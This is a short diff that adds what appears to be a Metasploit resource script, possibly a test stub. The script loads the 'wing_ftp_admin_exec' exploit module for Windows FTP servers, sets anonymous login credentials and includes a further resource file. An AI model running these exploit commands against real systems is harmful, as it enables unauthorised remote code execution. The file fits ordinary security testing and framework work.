@@ -1,0 +1,4 @@
+use exploits/windows/ftp/wing_ftp_admin_exec
+set USERNAME anonymous
+set PASSWORD mozilla@example.com
+resource stub_ftp_explt_rhost.rb
